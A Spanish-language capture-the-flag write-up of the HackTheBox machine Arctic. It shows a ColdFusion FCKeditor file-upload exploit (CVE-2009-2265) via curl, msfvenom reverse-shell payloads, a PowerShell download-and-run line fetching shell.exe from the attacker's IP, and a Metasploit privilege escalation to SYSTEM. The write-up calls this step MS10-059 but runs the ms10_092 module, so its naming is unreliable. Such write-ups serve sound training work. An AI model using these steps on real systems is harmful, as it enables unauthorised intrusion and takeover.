---
title: "Arctic — HackTheBox"
machine: "Arctic"
platform: "HackTheBox"
os: "Windows"
difficulty: "Medium"
tags: ["CVE", "RCE", "Upload", "Privesc", "Web"]
retired: true
summary: "Arctic es una máquina Windows de dificultad fácil que corre Adobe ColdFusion 8. La explotación comienza con una subida arbitraria de archivos sin autenticación "
draft: false
---
**Dificultad:** Fácil
**OS:** Windows
**IP:** 10.129.34.14

---

## indice

### Descripción General

Arctic es una máquina Windows de dificultad fácil que corre Adobe ColdFusion 8. La explotación comienza con una subida arbitraria de archivos sin autenticación a través del componente FCKeditor (CVE-2009-2265), obteniendo una shell como `tolis`. La escalada de privilegios se logra mediante el exploit MS10-059 aprovechando que la máquina no tiene ningún hotfix aplicado, obteniendo `NT AUTHORITY\SYSTEM`.

Tecnologías clave: Adobe ColdFusion 8, FCKeditor, JRun Web Server, Windows Server 2008 R2

---

### Reconocimiento

### Nmap

bash

```jsx
sudo nmap 10.129.34.14 -p- --open --min-rate 5000 -Pn -n -oG target
sudo nmap 10.129.34.14 -p 135,8500,49154 -sCV -Pn -oN targeted
```

```jsx
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows
```

El puerto 8500 corre JRun Web Server con listado de directorios habilitado. Navegando a `http://10.129.34.14:8500/` se observan dos directorios: `/CFIDE/` y `/cfdocs/`. Las fechas de los archivos (03/18/08) confirman **Adobe ColdFusion 8**.

---

### Acceso Inicial — CVE-2009-2265 FCKeditor File Upload

### Análisis del Módulo de Metasploit

Revisando el módulo `16788.rb` de ExploitDB se identifican dos detalles críticos para replicar el exploit manualmente:

ruby

```jsx
page = rand_text_alpha_upper(rand(10) + 1) + ".jsp"
dbl.add_part(payload.encoded, "application/x-java-archive", nil,
  "form-data; name=\"newfile\"; filename=\"#{rand_text_alpha_upper(8)}.txt\"")
'query' => "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00"
'uri'   => '/userfiles/file/' + page
```

Dos puntos clave:

- El archivo se sube con extensión `.txt`, no `.jsp` — ColdFusion filtra `.jsp` directamente
- El null byte `%00` va en el parámetro `CurrentFolder` con el nombre `.jsp`, no en el archivo

### Generación del Payload

bash

```jsx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.74 LPORT=443 -f raw > shell.jsp
cp shell.jsp shell.txt
```

### Subida del Archivo

bash

```jsx
curl -k -X POST \
  "http://10.129.34.14:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00" \
  -F "newfile=@shell.txt;type=application/octet-stream" \
  --output -
```

```jsx
Respuesta del servidor:
window.parent.OnUploadCompleted( 202, "", "shell.jsp", "0" );
```

### Ejecución

bash

```jsx
# Terminal 1
nc -nlvp 443

# Terminal 2
curl -s http://10.129.34.14:8500/userfiles/file/shell.jsp
```

Shell obtenida como `tolis`:

```jsx
connect to [10.10.17.74] from (UNKNOWN) [10.129.34.14] 49461
Microsoft Windows [Version 6.1.7600]
C:\ColdFusion8\runtime\bin>
```

La flag de usuario se encuentra en `C:\Users\tolis\Desktop\user.txt`.

---

### Escalada de Privilegios — MS10-059

### Enumeración

cmd

```jsx
systeminfo
OS Name:    Microsoft Windows Server 2008 R2 Standard
OS Version: 6.1.7600 N/A Build 7600
Hotfix(s):  N/A
```

Sin ningún hotfix aplicado, la máquina es vulnerable a múltiples exploits locales. El vector elegido es **MS10-059 (Chimichurri)** vía Metasploit.

### Preparación del Payload Meterpreter

bash

```jsx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.74 LPORT=4242 -f exe > shell.exe
python3 -m http.server 80
```

### Descarga y Ejecución desde la Shell

cmd

```jsx
cd C:\Windows\Temp
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.17.74/shell.exe','shell.exe')"
.\shell.exe
```

### Listener Metasploit

bash

```jsx
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.17.74
set lport 4242
run
[*] Meterpreter session 1 opened
```

### Migración a Proceso x64

La shell de ColdFusion corre en x86. Para ejecutar MS10-059 correctamente hay que migrar a un proceso x64 propiedad de `tolis`:

```jsx
meterpreter > ps
# jrunsvc.exe x64  PID 1156  ARCTIC\tolis
meterpreter > migrate 1156
[*] Migration completed successfully
```

Ejecución del Exploit

```jsx
meterpreter > run exploit/windows/local/ms10_092_schelevator lhost=10.10.17.74 lport=5555 ForceExploit=true
[*] Meterpreter session 2 opened
meterpreter > sessions -i 2
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
La flag de root se encuentra en C:\Users\Administrator\Desktop\root.txt.
```

---

### Resumen de la Cadena de Ataque

```jsx
Puerto 8500 (JRun) ──► ColdFusion 8 detectado
        │
        ▼
CVE-2009-2265 FCKeditor ──► Subida de .txt con null byte en CurrentFolder
        │
        ▼
shell.jsp en /userfiles/file/ ──► Shell como tolis
        │
        ▼
systeminfo ──► Sin hotfixes (Windows Server 2008 R2 Build 7600)
        │
        ▼
Meterpreter x64 ──► Migración a jrunsvc.exe
        │
        ▼
MS10-059 (ms10_092_schelevator) ──► NT AUTHORITY\SYSTEM ✓
```

---

### Lecciones Aprendidas

- Los exploits viejos en Metasploit a veces fallan el check de vulnerabilidad pero funcionan con `ForceExploit=true` — vale la pena reintentar
- Al replicar exploits de Metasploit manualmente, leer el `.rb` línea por línea revela detalles no documentados (como subir `.txt` en lugar de `.jsp`)
- En máquinas con alta latencia, la paciencia es parte del exploit

---

*Writeup por* **4Pr3nd1z** *— Mayo 2026*
